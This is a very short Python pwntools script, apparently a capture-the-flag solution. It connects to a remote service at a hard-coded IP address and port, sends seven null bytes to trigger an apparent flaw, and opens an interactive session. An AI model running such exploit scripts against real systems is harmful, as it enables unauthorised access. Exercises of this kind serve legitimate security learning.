from pwn import *

io = remote('94.237.49.138', 47170)

io.send(b'\0'*7)

io.interactive()